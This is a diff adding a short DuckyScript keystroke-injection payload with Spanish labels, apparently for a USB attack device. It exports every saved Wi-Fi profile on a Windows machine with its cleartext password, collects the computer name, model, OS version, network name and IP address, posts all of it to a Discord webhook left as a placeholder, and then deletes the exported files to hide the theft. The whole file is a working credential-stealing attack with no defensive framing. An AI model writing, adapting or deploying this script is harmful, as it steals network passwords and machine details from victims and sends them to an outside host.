@@ -1,0 +1,28 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+DELAY 100
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+ENTER
+DELAY 100
+DELAY 500
+STRING powershell -Command "$pcName = $env:COMPUTERNAME; $pcModel = (Get-WmiObject -Class Win32_ComputerSystem).Model; $osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Version; $wifiSSID = (netsh wlan show interfaces | Select-String 'SSID' | ForEach-Object { ($_ -split ': ')[1].Trim() })[0]; $ipv4Address = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi*' }).IPAddress; $message = @{content=\"**Nombre de la computadora/Usuario**: $pcName`n**Modelo**: $pcModel`n**Version de Windows**: $osVersion`n**Red WiFi**: $wifiSSID`n**Direccion IPv4**: $ipv4Address\"} | ConvertTo-Json; Invoke-WebRequest -Uri 'DISCORD WEBHOOK LINK HERE' -Method POST -Body $message -ContentType 'application/json'"
+ENTER
+DELAY 100
+DELAY 500
+STRING powershell -Command "$content = Get-Content WiFi-Key -Raw; $escapedContent = $content -replace '\"','\\\"' -replace '\\','\\\\' -replace '`n','\n' -replace '`r','\r'; $message = @{content=$escapedContent} | ConvertTo-Json; Invoke-WebRequest -Uri 'DISCORD WEBHOOK LINK HERE' -Method POST -Body $message -ContentType 'application/json'"
+ENTER
+STRING del Wi* /s/f/q
+ENTER
+DELAY 500
+STRING exit
+ENTER
